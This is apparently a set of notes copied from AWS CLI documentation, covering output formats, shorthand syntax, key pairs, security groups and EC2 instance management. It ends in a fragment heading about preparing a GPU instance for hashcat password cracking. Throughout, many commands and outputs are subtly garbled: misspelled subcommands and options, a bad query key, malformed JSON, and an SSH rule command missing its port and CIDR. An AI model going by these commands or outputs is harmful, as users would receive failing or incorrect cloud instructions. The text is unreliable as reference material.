The text output format follows the basic structure shown below. The columns are sorted alphabetically by the corresponding key names of the underlying JSON object.

        IDENTIFIER sorted-column1 sorted-column2
        IDENTIFIER2 sorted-column1 sorted-column2
The following is an example of a text output.

        $ aws describe-volumes --output text
        VOLUMES us-west-2a 2013-09-17T00:55:03.000Z 30  snap-f23ec1c8 in-use vol-e11a5288 standard
        ATTACHMENTS     2013-09-17T00:55:03.000Z        True    /dev/sda1       i-a071c394      attached        vol-e11a5288
        VOLUMES us-west-2a      2013-09-18T20:26:15.000Z        8       snap-708e8348   in-use  vol-2e410a47    standard
        ATTACHMENTS     2013-09-18T20:26:16.000Z        True    /dev/sda1       i-4b41a37c      attached        vol-2e410a47
We strongly recommend that the text output be used along with the `--query` option to ensure consistent behavior. This is because the text format alphabetically orders output columns, and similar resources may not always have the same collection of keys. For example, a JSON representation of a Linux EC2 instance may have elements that are not present in the JSON representation of a Windows instance, or vice versa. Also, resources may have key-value elements added or removed in future updates, altering the column ordering. This is where the `--query` arguments the functionality of the text output to enable complete control over the output format. In the example below, the command pre-selects which elements to display and defines the ordering of the columns with the list notation [key1,key2,...]. This gives users full confidence that the correct key values will always be displayed in the expected column. Finally, notice how the AWS CLI outputs 'None' as values for keys that don't exist.

        $ aws ec2 descirbe-volumes --query 'Volumes[*].[VolumeId,Attachments[0].InstanceId,AvailableZone,Size,FakeKey]' --output text
        vol-e11a5288 i-a071c394 us-west-2a 30 None
        vol-2e410a47 i-4b41a37c us-west-2a 8  None
Below is an example of how `grep` and `awk` can be used along with a text output from `aws ec2 describe-instances` command. The first command displays the AvailabilityZone, state, and instance ID of each instance in text output. The second command outputs only the instance IDs of all running instances in the `us-west-2a` Availability Zone.

        $ aws ec2 describe-instances --query 'Reservations[*].Instances[*].[Placement.AvailableZone,State.Name,InstanceId]' --output text
        us-west-2a running i-4b41a37c
        us-west-2a      stopped i-a071c394
        us-west-2b      stopped i-97a217a0
        us-west-2a      running i-3045b007
        us-west-2a      running i-6fc67758

        $ aws ec2 describe-instances --query 'Reservations[*].Instances[*].[Placement.AvailabilityZone,State.Name,InstanceId]' --output text | grep us-west-2a|grep running|awk '{print $3}'
        i-4b41a37c
        i-3045b007
        i-6fc67758
The next command shows a similar example for all stopped instances and takes it one step further to automate changing instance types for each stopped instance.

        $ aws ec2 describe-instances --query 'Reservations[*].Instances[*]].[State.Name,InstanceId]' --output text|
        > grep stopped|
        > awk '{print $2}'|
        > while read line;
        > do aws ec2 modify-instance-attribute --instance-id $line --instance-type '{"Value":"m1.medium"}';
        > done
####### Table Output Format
The table format produces human-readable representations of AWS CLI output. Here is an example:

        $ aws ec2 describe-volumes --output table
        ---------------------------------------------------------------------------------------------------------------------
        |                                                  DescribeVolumes                                                  |
        +-------------------------------------------------------------------------------------------------------------------+
        ||                                                     Volumes                                                     ||
        |+------------------+---------------------------+-------+----------------+---------+----------------+--------------+|
        || AvailabilityZone |        CreateTime         | Size  |  SnapshotId    |  State  |   VolumeId     | VolumeType   ||
        |+------------------+---------------------------+-------+----------------+---------+----------------+--------------+|
        ||  us-west-2a      |  2013-09-17T00:55:03.000Z |  30   |  snap-f23ec1c8 |  in-use |  vol-e11a5288  |  standard    ||
        |+------------------+---------------------------+-------+----------------+---------+----------------+--------------+|
        |||                                                  Attachments                                                  |||
        ||+---------------------------+------------------------+-------------+--------------+------------+----------------+||
        |||        AttachTime         |  DeleteOnTermination   |   Device    | InstanceId   |   State    |   VolumeId     |||
        ||+---------------------------+------------------------+-------------+--------------+------------+----------------+||
        |||  2013-09-17T00:55:03.000Z |  True                  |  /dev/sda1  |  i-a071c394  |  attached  |  vol-e11a5288  |||
        ||+---------------------------+------------------------+-------------+--------------+------------+----------------+||
        ||                                                     Volumes                                                     ||
        |+------------------+---------------------------+-------+----------------+---------+----------------+--------------+|
        || AvailabilityZone |        CreateTime         | Size  |  SnapshotId    |  State  |   VolumeId     | VolumeType   ||
        |+------------------+---------------------------+-------+----------------+---------+----------------+--------------+|
        ||  us-west-2a      |  2013-09-18T20:26:15.000Z |  8    |  snap-708e8348 |  in-use |  vol-2e410a47  |  standard    ||
        |+------------------+---------------------------+-------+----------------+---------+----------------+--------------+|
        |||                                                  Attachments                                                  |||
        ||+---------------------------+------------------------+-------------+--------------+------------+----------------+||
        |||        AttachTime         |  DeleteOnTermination   |   Device    | InstanceId   |   State    |   VolumeId     |||
        ||+---------------------------+------------------------+-------------+--------------+------------+----------------+||
        |||  2013-09-18T20:26:16.000Z |  True                  |  /dev/sda1  |  i-4b41a37c  |  attached  |  vol-2e410a47  |||
        ||+---------------------------+------------------------+-------------+--------------+------------+----------------+||
The `--query` option can be used with the table format to display a set of elements pre-selected from the raw output. Note the output differences in dictionary and list notations: column names are alphabetically ordered in the first example, and unnamed columns are ordered as defined by the user in the second example.

        $ aws ec2 describe-volumns --query 'Volumes[*].{ID:VolumeId,InstanceId:Attachements[0].InstanceId,AZ:AvailabilityZone,Size:Size}' --output table
        ------------------------------------------------------
        |                   DescribeVolumes                  | 
        +------------+----------------+--------------+-------+
        |     AZ     |      ID        | InstanceId   | Size  |
        +------------+----------------+--------------+-------+
        |  us-west-2a|  vol-e11a5288  |  i-a071c394  |  30   |
        |  us-west-2a|  vol-2e410a47  |  i-4b41a37c  |  8    |
        +------------+----------------+--------------+-------+

        $ aws ec2 describe-volumes --query 'Volumns[*].[VolumeId,Attachments[0].InstanceId,AvailabilityZone,Size]' --output table
        ----------------------------------------------------
        |                  DescribeVolumes                 |
        +--------------+--------------+--------------+-----+
        |  vol-e11a5288|  i-a071c394  |  us-west-2a  |  30 |
        |  vol-2e410a47|  i-4b41a37c  |  us-west-2a  |  8  |
        +--------------+--------------+--------------+-----+
###### Using Shorthand Syntax with the AWS Command Line Interface
While the AWS Command Line Interface can take nonscalar option parameters in JSON format, it can be tedious to type large JSON lists or structures on the command line. To address this issue, the AWS CLI supports a shorthand syntax that allows simpler representation of your option parameters than using the full JSON format.
####### Structure Parameters
The shorthand syntax in the AWS CLI makes it easier for users to input parameters that are flat (non-nested structures). The format is a comma separate list of key value pairs:
* Linux, macOS, or Unix
    `--option key1=value1, key2=value2,key3=value3`
* Windows PowerShell
    `--option "key1=value1,key2=value2,key3=value3"`
This is equivalent to the following example formatted in JSON:
`--option '{"Key1":"Value1","Key2":"Value2","Key3":"Value3"`
There must be no whitespace between each comma-separated key/value pair. Here is an example of the DynamoDB `update-table` command with the `--provisioned-throughput` option specified in shorthand.
`$ aws dynamodb udpate-table --provisioned-throughput ReadCapacityUnits=15,WriteCapacityUnits=10 --table-name MyDDBTable`
####### List Parameters
Input parameters in a list form can be specified in two ways: JSON and shorthand. The AWS CLI's shorthand syntax is designed to make it easier to pass lists with number, string, or non-nested structures. The basic format is shown here, where values in the list are separated by single space.
`--option value1 value2 value3`
This is equivalent to the following example formatted in JSON.
`--option '[value1,value2,value3]'`
As previously mentioned, you can specify a list of numbers, a list of strings, or a list of non-nested structures in shorthand. The following is an example of the `stop-instances` command for Amazon EC2, where the input parameters (list of strings) or the `--instance-ids` option is specified in shorthand.
`$ aws ec2 stop-instances --instance-ids i-1486157a i-1286157c i-ec3a7e87`
This is equivalent to the following example formatted in JSON.
`$ aws ec2 stop-instances --instance-ids '["i-1486157a","i-1286157c","i-ec3a7e87"]'`
Next is an example of the Amazon EC2 `create-tags` command, which takes a list of non-nested structures for the `--tags` option. The `--resoursces` option specifies the ID of the instance to be tagged.
`$ aws ec2 create-tags --resoursces i-1286157c --tags Key=My1stTag,Value=Value1 Key=My2ndTag,Value2 Key=My3rdTag,Value=Value3`
This is equivalent to the following example formatted in JSON. The JSON parameter is written in multiple lines of readability.

        $ aws ec2 create-tags --resources i-1286157c --tags '[
          {"Key":"My1stTag","Value":"Value1"},
          {"Key":"My2ndTag","Value":"Value2"},
          {"Key":"My3rdTag","Value":"Value3"}
        ]'
##### Using Amazon EC2 through the AWS Command Line Interface
You can access the features of Amazon EC2 using the AWS CLI. To list the AWS CLI commands for Amazon EC2, use the following command.
`$ aws ec2 help`
Before you run any commands, set your default credentials.
For examples for common tasks for Amazon EC2, see the following topics.
###### Using Key Pairs
You can use the AWS CLI to create, display, and delete your key pairs. You must specify a key pair when you launch and connect to an Amazon EC2 instance.
**Note**: Before you try the example commands, set your default credentials.
####### Creating a Key Pair
To create a key pair named "MyKeyPair", use the `create-key-pair` command, and use the `--query` option and the `--output text` option to pipe your private key directly into a file.
`$ aws ec2 create-key-pair --key-name MyKeyPair --query 'KeyMaterial' --output text > MyKeyPair.pem`
Note that for Windows PowerShell, the `>` file redirection defaults to UTF-8 encoding, which cannot be used with some SSH clients. So, you must explicitly specify ASCII encoding in the `out-file` command.
`aws ec2 create-key-pair --key-name MyKeyPair --query 'KeyMaterial' --output text | out-file -encoding ascii -filepath MyKeyPair.pem`
The resulting MyKeyPair.pem file looks like this:

        -----BEGIN RSA PRIVATE KEY-----
        EXAMPLEKEYKCAQEAy7WZhaDsrA1W3mRlQtvhwyORRX8gnxgDAfRt/gx42kWXsT4rXE/b5CpSgie/
        vBoU7jLxx92pNHoFnByP+Dc21eyyz6CvjTmWA0JwfWiW5/akH7iO5dSrvC7dQkW2duV5QuUdE0QW
        Z/aNxMniGQE6XAgfwlnXVBwrerrQo+ZWQeqiUwwMkuEbLeJFLhMCvYURpUMSC1oehm449ilx9X1F
        G50TCFeOzfl8dqqCP6GzbPaIjiU19xX/azOR9V+tpUOzEL+wmXnZt3/nHPQ5xvD2OJH67km6SuPW
        oPzev/D8V+x4+bHthfSjR9Y7DvQFjfBVwHXigBdtZcU2/wei8D/HYwIDAQABAoIBAGZ1kaEvnrqu
        /uler7vgIn5m7lN5LKw4hJLAIW6tUT/fzvtcHK0SkbQCQXuriHmQ2MQyJX/0kn2NfjLV/ufGxbL1
        mb5qwMGUnEpJaZD6QSSs3kICLwWUYUiGfc0uiSbmJoap/GTLU0W5Mfcv36PaBUNy5p53V6G7hXb2
        bahyWyJNfjLe4M86yd2YK3V2CmK+X/BOsShnJ36+hjrXPPWmV3N9zEmCdJjA+K15DYmhm/tJWSD9
        81oGk9TopEp7CkIfatEATyyZiVqoRq6k64iuM9JkA3OzdXzMQexXVJ1TLZVEH0E7bhlY9d8O1ozR
        oQs/FiZNAx2iijCWyv0lpjE73+kCgYEA9mZtyhkHkFDpwrSM1APaL8oNAbbjwEy7Z5Mqfql+lIp1
        YkriL0DbLXlvRAH+yHPRit2hHOjtUNZh4Axv+cpg09qbUI3+43eEy24B7G/Uh+GTfbjsXsOxQx/x
        p9otyVwc7hsQ5TA5PZb+mvkJ5OBEKzet9XcKwONBYELGhnEPe7cCgYEA06Vgov6YHleHui9kHuws
        ayav0elc5zkxjF9nfHFJRry21R1trw2Vdpn+9g481URrpzWVOEihvm+xTtmaZlSp//lkq75XDwnU
        WA8gkn6O3QE3fq2yN98BURsAKdJfJ5RL1HvGQvTe10HLYYXpJnEkHv+Unl2ajLivWUt5pbBrKbUC
        gYBjbO+OZk0sCcpZ29sbzjYjpIddErySIyRX5gV2uNQwAjLdp9PfN295yQ+BxMBXiIycWVQiw0bH
        oMo7yykABY7Ozd5wQewBQ4AdSlWSX4nGDtsiFxWiI5sKuAAeOCbTosy1s8w8fxoJ5Tz1sdoxNeGs
        Arq6Wv/G16zQuAE9zK9vvwKBgF+09VI/1wJBirsDGz9whVWfFPrTkJNvJZzYt69qezxlsjgFKshy
        WBhd4xHZtmCqpBPlAymEjr/TOlbxyARmXMnIOWIAnNXMGB4KGSyl1mzSVAoQ+fqR+cJ3d0dyPl1j
        jjb0Ed/NY8frlNDxAVHE8BSkdsx2f6ELEyBKJSRr9snRAoGAMrTwYneXzvTskF/S5Fyu0iOegLDa
        NWUH38v/nDCgEpIXD5Hn3qAEcju1IjmbwlvtW+nY2jVhv7UGd8MjwUTNGItdb6nsYqM2asrnF3qS
        VRkAKKKYeGjkpUfVTrW0YFjXkfcrR/V+QFL5OndHAKJXjW7a4ejJLncTzmZSpYzwApc=
        -----END RSA PRIVATE KEY-----
Your private key is not stored in AWS and can only be retrieved when it is created.
If you're sing an SSH client on a Linux computer to connect to your instance, use the following command to set the permissions of your private key file so that only you can read it.
`$ chmod 400 MyKeyPair.pem`
####### Displaying Your Key Pair
A fingerprint is generated from your key pair, and you can use to verify that the private key that you have on your local machine matches the public key that's stored in AWS. The fingerprint is an SHA1 hahs take from a DER encoded copy of the private key. This value is stored in AWS and can be viewed in the EC2 management console or by calling `aws ec2 describe-key-pairs`. For example, you can view the fingerprint for MyKeyPair using the following command:

        $ aws ec2 describe-key-pairs --key-name MyKeyPair
        {
          "KeyPairs":[
            {
              "KeyName":"MyKeyPair",
              "KeyFingerprint":"1f:51:ae:28:bf:89:e9:d8:1f:25:5d:37:2d:7d:b8:ca:9f:f5:f1:6f"
            }
          ]
        }
####### Deleting Your Key Pair
To delete MyKeyPair, use the `delete-key-pair` command as follows:
`$ aws ec2 delete-key-pair --key-name MyKeyPair`
###### Using Security Groups
You create a security group for use in either EC2-Classic or EC2-VPC. For more information about EC2-Classic and EC2-VPC, see Supported Platforms in the Amazon EC2 User Guide for Linux Instances.
You can use the AWS CLI to create, add rules to, and delete your security groups.
**Note**: Before you try the example commands, set your default credentials.
####### Creating a Security Group
To create a security group named my-sg, use the `create-security-group` command.
######## EC2-VPC
The following command creates a security group named my-sg for the specified VPC:

        aws ec2 create-security-group --group-name my-sg --description "My security group" --vpc-id vpc-1a2b3c4d
        {
          "GroupId":"sg-903004f8"
        }
To view the initial information for my-sg, use the `describe-security-groups` command as follows. Note that you can't reference a security group for EC2-VPC by name.

        aws ec2 describe-security-groups --group-ids sg-903004f8
        {
          "SecurityGroups":[
            {
               "IpPermissionsEgress":[
                 {
                   "IpProtocol":"-1",
                   "IpRanges":[
                     {
                       "CidrIp":"0.0.0.0/0"
                     }
                   ],
                   "UserIdGroupPairs":[]
                  }
                ],
                "Description":"My security group"
                "IpPermissions":[],
                "GroupName":"my-sg",
                "VpcId":"vpc-1a2b3c4d",
                "OwnerId":"123456789012",
                "GroupId":"sg-903004f8"
              }
            ]
        }
######## EC2-Classic
The following command creates a security group for EC2-Classic:

        aws ec2 create-sescurity-group --group-name my-sg --description "My security group"
        {
          "GroupId":"sg-903004f8"
        }
To view the initial information for my-sg, use the `describe-security-groups` command as follows:

        aws ec2 describe-security-groups --group-names my-sg
        {
          "SecurityGroups":[
            {
              "IpPermissionsEgress":[],
              "Description":"My security group",
              "IpPermissions":[].
              "GroupName":"my-sg",
              "OwnerId":"123456789012",
              "GroupId":"sg-903004f8"
            }
          ]
        }
####### Adding Rules to Your Security Group
If you're launching a Windows instance, you must add a rule to allow inbound traffic on TCP port (RDP). If you're launching a Linux instance, yo must add a rule to allow inbound traffic on TCP port 22 (SSH). Use the `authorize-security-group-ingress` command to add a rule to your security group. One of the required parameters of this command is the public IP address of your computer, in CIDR notation.
**Note**: You can get the public IP address of your local computer using a service. For example, we provide the following service:
https://checkip.amazonaws.com/. To locate another service that provides your IP address, use the search phrase "what is my IP address". If you are connecting through an ISP or from behind you firewall without s static IP address, you need to find out the range of IP addresses used by client computers.
######## EC2-VPC
The following command adds a rule for RDP to the security group with the ID sg-903004f8:
`aws ec2 authorize-security-group-ingress --group-id sg-903004f8 --protocol tc --port 3389 -cidr 203.0.113.0/24`
The following command adds a rule for SSH to the security group with the ID sg-903004f8:
`aws ec2 authorize-security-group-ingress --group-id sg-903004f8 --protocol tcp --port 22 cidr 203.0.113.0/24`
To view the changes to my-sg, use the `describe-security-groups` command as follows:

        aws ec2 describe-security-groups --group-ids sg-903004f8
        {
          "SecurityGroups":[
            {
              "IpPermissionsEgress":[
                {
                  "IpProtocol":"-1",
                  "IpRanges":[
                    {
                      "CidrIp":"0.0.0.0/0"
                    }
                  ],
                  "UserIdGroupPairs":[]
                }
              ],
              "Description":"My security group"
              "IpPermissions":[
                {
                  "ToPort":22,
                  "IpProtocol":"tcp",
                  "IpRanges":[
                    {
                      "CidrIp":"203.0.113.0/24"
                    }
                  ]
                  "UserIdGroupPairs":[],
                  "FromPort":22
                }
              ],
              "GroupName":"my-sg",
              "OwnerId":"123456789012",
              "GroupId":"sg-903004f8"
            }
          ]
        }
######## EC2-Classic
The following command adds a rule for RDP to the security group my-sg:
`aws ec2 autorize-security-group-ingress --group-name my-sg --protocol tcp --port 3389 --cidr 203.0.113.0/24`
The following command adds a rule for SSH to the security group for my-sg:
        
        aws ec2 authorize-security-group-ingress --group-names my-sg
        {
          "IpPermissionsEgress":[],
          "Description":"My security group"
          "IpPermissions":[
            {
              "ToPort":22,
              "IpProtocol":"tcp",
              "IpRanges":[
                {
                  "CidrIp":"203.0.113.0/24"
                }
              ]
              "UserIdGroupPairs":[],
              "FromPort":22
            }
           ],
           "GroupName":"my-sg",
           "OwnerId":"123456789012",
           "GroupId":"sg-903004f8"
          }
        ]
        }
####### Deleting Your Security Group
To delete a security group, use the `delete-security-group` command. Note that you can't delete a security group if it is attached to an environment.
######## EC2-VPC
The following command deletes the security group with the ID sg-903004f8:
`aws ec2 delete-security-group --group-id sg-903004f8`
######## EC2-Classic
`aws ec2 delete-sescurity-group --group-name my-sg`
###### Using Amazon EC2 Instances
You can use the AWS CLI to launch, list, and terminate instances. You'll need a key pair and a security group; for information about creating these  through the AWS CLI, see Using Key Pairs and Using Security Groups. You'll also need to select an Amazon Machine Image (AMI) and note its AMI ID. For more information, see Finding a Suitable AMI in the Amazon EC2 User Guide for Linux Instances.
If you launch an instance that is not within the AWS Free Tier, you are billed after yo launch the instance and charged for the time that the instance is running, even if it remains idle.
**Note**: Before you try the example command, set your default credentials.
####### Launching an Instance
To launch a single Amazon EC2 instance using the AMI you selected, use the `run-instances` command. Depending on the platforms that your account supports, you can launch the instance into EC2-Classic or EC2-VPC.
Initially, your instance is in the `pending` state, but will be in the `running` state in a few minutes.
######## EC2-VPC
The following command launches a t2.micro instance in the specified subnet:

        aws ec2 run-instances --image-id ami-xxxxxxxxx --count 1 --instance-type t2.micro --key-name MyKeyPair --security-group-ids sg-xxxxxxxx --subnet-id subnet-xxxxxxxx
        {
            "OwnerId": "123456789012",
            "ReservationId": "r-5875ca20",
            "Groups": [
                {
                    "GroupName": "my-sg",
                    "GroupId": "sg-903004f8"
                }
            ],
            "Instances": [
                {
                    "Monitoring": {
                        "State": "disabled"
                    },
                    "PublicDnsName": null,
                    "Platform": "windows",
                    "State": {
                        "Code": 0,
                        "Name": "pending"
                    },
                    "EbsOptimized": false,
                    "LaunchTime": "2013-07-19T02:42:39.000Z",
                    "PrivateIpAddress": "10.0.1.114",
                    "ProductCodes": [],
                    "VpcId": "vpc-1a2b3c4d",
                    "InstanceId": "i-5203422c",
                    "ImageId": "ami-173d747e",
                    "PrivateDnsName": ip-10-0-1-114.ec2.internal,
                    "KeyName": "MyKeyPair",
                    "SecurityGroups": [
                        {
                            "GroupName": "my-sg",
                            "GroupId": "sg-903004f8"
                        }
                    ],
                    "ClientToken": null,
                    "SubnetId": "subnet-6e7f829e",
                    "InstanceType": "t2.micro",
                    "NetworkInterfaces": [
                        {
                            "Status": "in-use",
                            "SourceDestCheck": true,
                            "VpcId": "vpc-1a2b3c4d",
                            "Description": "Primary network interface",
                            "NetworkInterfaceId": "eni-a7edb1c9",
                            "PrivateIpAddresses": [
                                {
                                    "PrivateDnsName": "ip-10-0-1-114.ec2.internal",
                                    "Primary": true,
                                    "PrivateIpAddress": "10.0.1.114"
                                }
                            ],
                            "PrivateDnsName": "ip-10-0-1-114.ec2.internal",
                            "Attachment": {
                                "Status": "attached",
                                "DeviceIndex": 0,
                                "DeleteOnTermination": true,
                                "AttachmentId": "eni-attach-52193138",
                                "AttachTime": "2013-07-19T02:42:39.000Z"
                            },
                            "Groups": [
                                {
                                    "GroupName": "my-sg",
                                    "GroupId": "sg-903004f8"
                                }
                            ],
                            "SubnetId": "subnet-6e7f829e",
                            "OwnerId": "123456789012",
                            "PrivateIpAddress": "10.0.1.114"
                        }              
                    ],
                    "SourceDestCheck": true,
                    "Placement": {
                        "Tenancy": "default",
                        "GroupName": null,
                        "AvailabilityZone": "us-west-2b"
                    },
                    "Hypervisor": "xen",
                    "BlockDeviceMappings": [
                        {
                            "DeviceName": "/dev/sda1",
                            "Ebs": {
                                "Status": "attached",
                                "DeleteOnTermination": true,
                                "VolumeId": "vol-877166c8",
                                "AttachTime": "2013-07-19T02:42:39.000Z"
                            }
                        }              
                    ],
                    "Architecture": "x86_64",
                    "StateReason": {
                        "Message": "pending",
                        "Code": "pending"
                    },
                    "RootDeviceName": "/dev/sda1",
                    "VirtualizationType": "hvm",
                    "RootDeviceType": "ebs",
                    "Tags": [
                        {
                            "Value": "MyInstance",
                            "Key": "Name"
                        }
                    ],
                    "AmiLaunchIndex": 0
                }
            ]
        }
######## EC2-Classic
The following command launches a t1.micro instance in EC2-Classic:

        aws ec2 run-instances --image-id ami-xxxxxxxx --count 1 --instance-type t1.micro --key-name MyKeyPair --security-groups my-sg
        {
            "OwnerId": "123456789012",
            "ReservationId": "r-5875ca20",
            "Groups": [
                {
                    "GroupName": "my-sg",
                    "GroupId": "sg-903004f8"
                }
            ],
            "Instances": [
                {
                    "Monitoring": {
                        "State": "disabled"
                    },
                    "PublicDnsName": null,
                    "Platform": "windows",
                    "State": {
                        "Code": 0,
                        "Name": "pending"
                    },
                    "EbsOptimized": false,
                    "LaunchTime": "2013-07-19T02:42:39.000Z",
                    "ProductCodes": [],
                    "InstanceId": "i-5203422c",
                    "ImageId": "ami-173d747e",
                    "PrivateDnsName": null,
                    "KeyName": "MyKeyPair",
                    "SecurityGroups": [
                        {
                            "GroupName": "my-sg",
                            "GroupId": "sg-903004f8"
                        }
                    ],
                    "ClientToken": null,
                    "InstanceType": "t1.micro",
                    "NetworkInterfaces": [],
                    "Placement": {
                        "Tenancy": "default",
                        "GroupName": null,
                        "AvailabilityZone": "us-west-2b"
                    },
                    "Hypervisor": "xen",
                    "BlockDeviceMappings": [
                        {
                            "DeviceName": "/dev/sda1",
                            "Ebs": {
                                "Status": "attached",
                                "DeleteOnTermination": true,
                                "VolumeId": "vol-877166c8",
                                "AttachTime": "2013-07-19T02:42:39.000Z"
                            }
                        }              
                    ],
                    "Architecture": "x86_64",
                    "StateReason": {
                        "Message": "pending",
                        "Code": "pending"
                    },
                    "RootDeviceName": "/dev/sda1",
                    "VirtualizationType": "hvm",
                    "RootDeviceType": "ebs",
                    "Tags": [
                        {
                            "Value": "MyInstance",
                            "Key": "Name"
                        }
                    ],
                    "AmiLaunchIndex": 0
                }
            ]
        }
####### Adding a Block Device Mapping to Your Instance
Each instance that you launch has an associated root device volume. You can use block device mapping to specify additional EBS volumes or instance store volumes to attach to an instance when it's launched.
To add a block device mapping to your instance, specify the `--block-device-mappings` option when you use `run-instances`.
The following example adds a standard Amazon EBS volume, mapped to `/dev/sdf`, that's 20 GB in size.
`--block-device-mappings "[{\"DeviceName\":\"/dev/sdf\",\"Ebs\":{\"VolumeSize\":20,\"DeleteOnTermination\":false}}]"`
The following example adds an Amazon EBS volume, mapped to `/dev/sdf`, based on a snapshot. When you  specify a snapshot, it isn't necessary to specify a volume size, but if you do, it must be greater or equal to the size of the snapshot.
`--block-device-mappings "[{\"DeviceName\":\"/dev/sdf\",\"Ebs\":{\"SnapshotId\":\"snap-xxxxxxxx\"}}]"`
The following example adds two instance store volumes. Note that the number of instance store volumes available to your instance depends on its instance type.
`--block-device-mappings "[{\"DeviceName\":\"/dev/sdf\",\"VirtualName\":\"ephemeral0\"},{\"DeviceName\":\"/dev/sdg\",\"VirtualName\":\"ephemeral1\"}]"`
The following example omits a mapping for a device specified by the AMI used to launch the instance (`/dev/sdj`):
`--block-device-mappings "[{\"DeviceName\":\"/dev/sdj\",\"NoDevice\":\"\"}]"`
For more information, see Block Device Mapping in the Amazon EC2 User Guide for Linux Instances.
####### Adding a Name Tag to Your Instance
To add the tag `Name=MyInstance` to your instance, use the `create-tags` commands as follows:
`aws ec2 create-tags --resources i-xxxxxxxxx --tags Key=Name,Value=MyInstance`
For more information, see Tagging Your Resources in the Amazon EC2 User Guide for Linux Instances.
####### Connecting to Your Instance
While your instance is running, you can connect to it and use it just as you'd use a computer sitting in front of you. For more information, see Connect to Your Amazon EC2 Instance in the Amazon EC2 User Guide for Linux Instances.
####### Listing Your Instances
You can use the AWS CLI to list your instances and view information about them. You can list all your instances, or filter the results based on the instances that you're interested in.
**Note**: Before you try the example commands, set your default credentials.
The following examples show how to use the `describe-instances` command.
**Example 1: List the instances with the specified instance type**
The following command lists your t2.micro instances.
`aws ec2 describe-instances --filters "Name=instance-type,Values=t2.micro" --query Reservations[].Instances[].InstanceId`
**Example 2: List the instances with the specified tag**
The following command lists the instances with a tag "Name=MyInstance".
`aws ec2 describe-instances --filters "Name=tag:Name,Values=MyInstance"`
**Example 3: List the instances launched using the specified images**
The following command lists your instances that were launched from the following AMIs: ami-x0123456,ami-y0123456,ami-z0123456.
`aws ec2 describe-instances --filters "Name=image-id,Values=ami-x0123456,ami=y0123456,ami-z0123456"`
####### Terminating Your Instance
Terminating an instance effectively deletes it; you can't reconnect to an instance after you've terminated it. As soon as the state of the instance changes to `shutting-down` or `terminated`, you stop incurring charges for that instance.
When you are finished with the instance, use the `terminate-instances` command as follows:

        aws ec2 terminate-instances --instance-ids i-5203422c
        {
          "TerminatingInstances":[
            {
              "InstanceId":"i-5203422c",
              "CurrentState":{
                "Code":32,
                "Name":"shutting-down"
              },
              "PreviousState":{
                "Code":16,
                "Name":"running"
              }
            }
          ]
        }
For more information, see Terminate Your Instance in the Amazon EC2 User Guide for Linux Instances.

##### Troubleshooting AWS CLI errors
After installing with `pip`, you may need to add the aws executable to your OS's PATH environment variable, or change its mode to make it executable.
###### **Error**: `aws: scommand not found`
You may need to add the aws executable to your OS's PATH environment variable.
If aws is in your PATH and you still see this error, you may no have the right file mode. Try running it directly.
`$ ~/.local/bin/aws --version`
###### Error: `permission denied`
Make sure that the aws script has a file mode that is executable. For example, 755.
Run `chmod +x` to make the file executable.
`$ chmod +x ~/.local/bin/aws`
###### Error: `AWS was not able to validate the provided credentials`
The AWS CLI may be reading credentials from a different location than you expect. Run `aws configure list` to confirm that the correct crednetials are used.

        $ aws configure list
        Name        Value       Type        Location
        ----        ----        ----        ----
        profile     <not set>   None        None
        access_key  \*********   XYVA        shared-credential-file
        secret_key  *********   ZAGY        shared-credential-file
        region      us-west-2   config-file ~/.aws/config

If the correct credentials are used, your clock may be out of sync. On Linux, macOS, or Unix, run `date` to check the time.
`date`
###### Error:`An error occurred (UnauthorizedOperation) when calling the CreateKeyPair operation: You are not authorized to perform this operation.
Your IAM user or role needs permission to call the API actions that correspond to the commands that you run with the AWS CLI. Most commands call a single action with a name that matches the command name; however, custom commands like `aws s3 sync` call multiple APIs. You can see which APIs a command calls by using the `--debug` option.
### User Guide for Linux Instances on Amazon EC2
#### [What Is Amazon EC2?](https://docs.aws.amazon.com/AWSEC2/latest/UserGuide/concepts.html)
##### Features of Amazon EC2
##### How to get started with Amazon EC2
##### Related Services
##### Accessing Amazon EC2
##### Pricing for Amazon EC2
##### [Instances and AMIs](https://docs.aws.amazon.com/AWSEC2/latest/UserGuide/ec2-instances-and-amis.html)
###### Instances
####### Storage for Your Instance
####### Security Best Practices
####### Stopping, Starting, and Terminating Instances
###### AMIs
##### [Regions and Availability Zones](https://docs.aws.amazon.com/AWSEC2/latest/UserGuide/using-regions-availability-zones.html)
###### Region and Availability Zone Concepts
####### Regions
####### Availability Zones
###### Available Regions
###### Regions and Endpoints
###### Describing Your Regions and Availability Zones
####### To find your regions and Availability Zones using the console
####### To find your regions and Availability Zones using the command line
###### Specifying the Region for a Resource
####### To specify the region for a resource using the console
####### To specify the default region using the environment
####### To specify the default region using the command line
###### Launching Instances in an Availability Zone
####### To specify an Availability Zone for your instance using the console
####### To specify an Availability Zone for your instance using the AWS CLI
####### To specify an Availability Zone for your instance using the AWS Tools for Windows PowerShell
###### Migrating an Instance to Another Availability Zone
##### [Amazon EC2 Root Device Volume](https://docs.aws.amazon.com/AWSEC2/latest/UserGuide/RootDeviceStorage.html)
###### Root Device Storage concepts
####### Instance Store-backed Instances
####### Amazon EBS-backed Instances
###### Choosing an AMI by Root Device Type
####### To choose an Amazon EBS-backed AMI using the console
####### To choose an instance store-backed AMI using the console
####### To verify the type of the root device volume of an AMI using the command line
###### Determining the Root Device Type of Your Instance
####### To determine the root device type of an instance using the console
####### To determine the root device type of an instance using the command line
###### Changing the Root Device Volume to Persist
####### To change the root device volume of an instance to persist at launch using the console
####### Changing the Root Volume of an Instance to Persist Using the AWS CLI
######## Example at Launch
######## Example While the Instance is Running
#### Setting Up with Amazon EC2
##### Sign Up for AWS
###### To create an AWS account
##### Create an IAM User
###### To create an IAM user for yourself and add the user to an Administrators group
##### Create a Key Pair
###### To create a key pair
###### To connect to your instance using your key pair
##### Create a Virtual Private Cloud (VPC)
##### Create a Security Group
#### Getting Started with Amazon EC2 Linux Instances
##### Overview
##### Prerequisites
##### Step 1: Launch an Instance
##### Step 2: Connect to Your Instance
##### Step 3: Clean Up Your Instance
##### Next Steps
* Learn how to remotely manage your EC2 instance using Run Command.
* Configure a CloudWatch alarm to notify you if your usage exceeds the Free Tier.
* Add an EBS volume.
* Install the LAMP stack.
#### [Best Practices for Amazon EC2](https://docs.aws.amazon.com/AWSEC2/latest/UserGuide/ec2-best-practices.html)

#### How to get prepare for hashcat
##### Setting up p3.16xlarge for hashcat
First of, you may need to request a limit increase so that you are allowed to launch the new p3.16xlarge instances. AWS was pretty responsive, it only took them 20 minutes or so.
